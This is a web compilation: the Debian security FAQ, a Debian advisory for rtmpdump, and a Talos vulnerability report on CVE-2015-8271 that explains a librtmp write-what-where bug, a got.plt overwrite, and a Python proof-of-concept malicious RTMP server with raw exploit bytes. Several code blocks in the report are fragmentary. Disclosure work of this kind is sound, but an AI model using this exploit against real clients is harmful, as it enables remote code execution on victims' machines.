*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Package        : rtmpdump
CVE ID         : CVE-2015-8270 CVE-2015-8271 CVE-2015-8272

Dave McDaniel discovered multiple vulnerabilities in rtmpdump, a small
dumper/library for RTMP media streams, which may result in denial of
service or the execution of arbitrary code if a malformed stream is
dumped.

For the stable distribution (jessie), these problems have been fixed in
version 2.4+20150115.gita107cef-1+deb8u1.

For the upcoming stable distribution (stretch), these problems have been
fixed in version 2.4+20151223.gitfa8646d.1-1.

For the unstable distribution (sid), these problems have been fixed in
version 2.4+20151223.gitfa8646d.1-1.

We recommend that you upgrade your rtmpdump packages.

# Talos Vulnerability Report

### TALOS-2016-0067

## RTMPDump librtmp AMF3 Class Member Count Remote Code Execution Vulnerability

##### January 7, 2016

##### CVE Number

CVE-2015-8271

### Description

The vulnerability occurs within the AMF3CD\_AddProp function within amf.c.
If an attacker sets up a malicious RTMP Media server that defines the number
of AMF3 Class Members in a certain way, the attacker can write data to a pointer
copied to an arbitrary address ending in 0. This leads to a “write-what-where”
condition that could lead to arbitrary remote code execution.

### Tested Versions

RTMPDump 2.4

librtmp 1.0

### Details

The RTMP protocol was developed by Macromedia (Adobe) for streaming audio,
video and data over the internet between a Flash player and a server. One
such client used for saving these streams locally to a file is called
RTMPDump. RTMPDump is available on Windows and Linux for free either
through https://rtmpdump.mplayerhq.hu/ or many Linux Official/Extra Repositories.
RTMPDump is also used by many media players including FFmpeg, MPlayer,
HTS Home Theater System and cURL.

The developers of RTMPDump also created a library for communicating over RTMP
called librtmp. This API provides a simplified interface to communicating over
this protocol. librtmp is used by several programs/platforms such as
RTMPDump (itself), livestreamer, youtube-dl, XBMC (Kodi), streamCapture and
several others.

When an RTMPClient initiates a connected with a server, a simple Handshake
exchange occurs. The client sends a packet starting with 0x03 to represent the
protocol followed by a 4-byte time stamp (not required) and ‘random’ data totaling
1536 bytes (known as C0 & C1, respectively). The server then responds with the byte 0x03
and another packet 1536 bytes long with the first 4 bytes containing a time stamp,
the second 4 containing 0’s and the rest being ‘random’ as well. (S0 and S1). The
client then sends C2, which is a copy of S1 and the server responds with S2 which is
a copy of C1.

### Exploiting

After this handshake is completed, RTMP data can be exchanged. If a server sends
the following bytes to the client after the handshake, the crash occurs:

bit[2]      = isExternalizable
bit[3]      = isDynamic
bit[4-31]   = classMembers (1-3 additional bytes used if MSB of first 1-3 bytes is set)

It appears that most (if not all) AMF3 Object Types are vulnerable. The following types
were tested successfully:

        0x0, 0x1, 0x2, 0x4, 0x5 0x6, 0x7, 0xA, 0xB, 0xC

:--: The crash could be triggered in a number of ways using many combinations of
:--: the following attributes.

    - literal object instance    = 1 | 0
        * if 0, the value copied to the attacker-controlled buffer will be 0.
            This will cause a DoS.
        * if 1, a pointer to the members of this object will be copied
            to the attacker-controlled buffer, potentially leading to RCE.
    - literal trait value        = 1 | 0
    - isExternalizable           = 1 | 0
    - isDynamic                  = 1 | 0
    - ClassMembers               = 0x1-0xFFFFFFF (1 to 268435455)
        * signed 29-bit integer since read as integer in AMF3ReadInteger() (see below)
        * The sign is removed if the value is > 268435455 but the maximum value stands

```

:-: AMF3 Objects

Objects can be sent as a reference to a previously occurring Object by using an index to
the implicit object reference table. Further more, trait information can also be sent as a
reference to a previously occurring set of traits by using an index to the implicit traits
reference table.

                             traits class-name *(UTF-8-vr))) *(value-type)
                             *(dynamic-member)))

```

Note that for U29O-traits-ext, after the class-name follows an indeterminable
number of bytes as \*(U8). This represents the completely custom serialization of
“externalizable” types. The client and server have an agreement as to how to read in this
information.

:-: AMF3 Variable-Length Encoding
1.3.2 Strings and UTF-8
AMF 0 and AMF 3 use (non-modified) UTF-8 to encode strings. UTF-8 is the
abbreviation for 8-bit Unicode Transformation Format. UTF-8 strings are typically
preceded with a byte-length header followed by a sequence of variable length (1 to 4
octets) encoded Unicode code-points. AMF 3 uses a slightly modified byte-length header;
a detailed description is provided below and referred to throughout the document.

```
         (hex)                     :                 (binary)
0x00000000 - 0x0000007F            :   0xxxxxxx
0x00000080 - 0x000007FF            :   110xxxxx 10xxxxxx
0x00000800 - 0x0000FFFF            :   1110xxxx 10xxxxxx 10xxxxxx
0x00010000 - 0x0010FFFF            :   11110xxx 10xxxxxx 10xxxxxx 10xxxxxx

```

This is handled by the function AMF3ReadInteger().

### Crash Information

```
:-: The crash is in amf.c
:-: It is triggered by defining an AMF3Class Object (0x11) that declares instance properties
:-: along with a member count. Since these values are supplied by the stream, the attacker
:-: can control the values of these properties.

:-: The structure used is the following:

struct AMF3ClassDef {
    AVal cd_name;           // Class Name
    char cd_externalizable; // is externalizable
    char cd_dynamic;        // is dynamic
    int cd_num;             // Class Member count
    AVal *cd_props;         // pointer to properies to add
}

type = struct AVal {
    char *av_val;
    int av_len;
}

:-: To exploit this vulnerability, the AMF3ClassDef variable 'cd->cd_num'
:-: must be populated. cd_num represents the number of properties for an object.
:-: This is sent in the modified variable-length-encoding format detailed above.
:-: We can only control the 25 bits to specify the address because traits take
:-: 4 bits and extension flags take 3. This allows us to control the 7 MSB of
:-: the address to write to, excluding the LSB which will become 0 before the
:-: vulnerabile code is executed.

:-: Once that value is set, a loop that calls AMFReadString at line 1079
:-: will be called for each class member specified (cd_num).

:-: This call populates an AVal struct called "memberName" which will
:-: be set to 0 if a reference trait is set, triggering a DoS. This is due to
:-: references being "not supported". However, the program will continue to
:-: run in this condition leading to a Null Pointer Dereference. If the
:-: trait is set to 'instance' the "memberName->av_val" pointer will point
:-: to next property to add in the datastream.

1083           pBuffer += len;
1084         }
1085     }
[...snip...]

:-: Once the "memberName" variable is initialized and points to the datastream,
:-: a call to AMF3CD_AddProp at line 1081 occurs.
:-: a trait check is called at line 1261 which skips line 1262 and the data
:-: from the stream is copied to an attacker-controlled address at line 1263.

1259 AMF3CD_AddProp(AMF3ClassDef *cd, AVal *prop)
1260 {
1261   if (!(cd->cd_num & 0x0f))
1262     cd->cd_props = realloc(cd->cd_props, (cd->cd_num + 16) * sizeof(AVal));
1263   cd->cd_props[cd->cd_num++] = *prop;
1264 }

:-: This "write-what-where" condition is illustrated at address 0x416f36
:-: in the assembly code for line 1263 below:

### Another Exploit Scenario

```
:-: An attacker could overwrite something more interesting such as the got.plt structure.
:-: There are protections in place on modern Linux systems to prevent the page
:-: containing the datastream from being executed. This is also not accounting for ASLR or other Linux
:-: exploit security protections, such as pie. However, this section is to provide
:-: more details of how this exploit could be utilized.

:-: For each property cd_num, the loop at line 1079 will continue to overwrite every
:-: other entry in the got.plt structure with memberName->av_val with each entry
:-: in between being set to memberName->av_len.

:-: For a string length of count of 0x9 (equals 0x4 when trait flags removed),
:-: each PLT entry between this is overwritten with 0x04000000.

:-: after a few rounds, the plt looks like this (note how every other entry
:-: is the length specified for this property).

:-: At this point, a got.plt entry that is called before the program crashes
:-: is needed. Luckily, a logging function is called soon after this
:-: exploit (rtmp_log_default at log.c:52) that subsequently calls vsnprintf()
:-: which happens to be at an address ending in 0.

0x0000000000402530 ? jmp    QWORD PTR [rip+0x21fd92]        # 0x6222c8 <vsnprintf@got.plt>

:-: To quickly determine the variable-length encoded bytes needed to overwrite
:-: this pointer, a handy tool called pyamf3 is available on GitHub
    https://github.com/hydralabs/pyamf
:-: It is important to remember that the required trait flags are needed which
:-: will be set to 0 before the exploit occurs.

:-: Use pyamf3 to grab this address

>>> encode_int(0x622537)

>>> p/x $rcx
$1 = 0x403530

>>> p/x $rax
$3 = 0x7034eb

>>> p/x *$rax

:-: Upon execution, $rip will point to the stream buffer address 0x7034eb containing
:-: the 'code' 0xcccccccc.

### Exploit Proof-of-Concept

```
:-: Start a malicious RTMP media server:
------------------------------------------------
#!/usr/bin/env python2

import socket
import signal
import sys

HOST = '0.0.0.0'
PORT = 1935
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

def run_program():
    print 'Connected by', addr

    # must pass the handshake first,
    # just reflecting the bytes back is enough
    # for rtmpdump to accept the handshake.

    data = conn.recv(2048)
    conn.send(data)
    print 'handshake 1 complete'

    data = conn.recv(2048)
    conn.send(data)
    print 'handshake 2 complete'

    data = conn.recv(2048)
    print 'sending exploit...'

    # Uncomment to write to 0x4141410, triggering a DoS
#data='\x03\x00\x00\x00\x00\x00\x1d\x14\x00\x00\x00\x00\x02\x00\x01\x5f\x00\xde\xad\xbe\xef\xde\xad\xbe\xef\x03\x00\x00\x11\x0a\x90\xa8\x94\x17\x03\x00\x05\x42\x42\x42\x42'

    # Uncomment to overwrite the vsnprintf() pointer to the data stream which will attempt to execute 0xCCCCCCCC as opcodes.
#data='\x03\x00\x00\x00\x00\x00\x1d\x14\x00\x00\x00\x00\x02\x00\x01\x5f\x00\xde\xad\xbe\xef\xde\xad\xbe\xef\x03\x00\x00\x11\x0a\x81\xc4\xa5\x37\x03\x00\x05\xcc\xcc\xcc\xcc'

    print "data sent:"

    conn.send(data)
    conn.close()

if __name__ == '__main__':
    run_program()

------------------------------------------------

:-: Start rtmpdump
------------------------------------------------

$ rtmpdump -r rtmp://127.0.0.1/app/test -o /dev/null
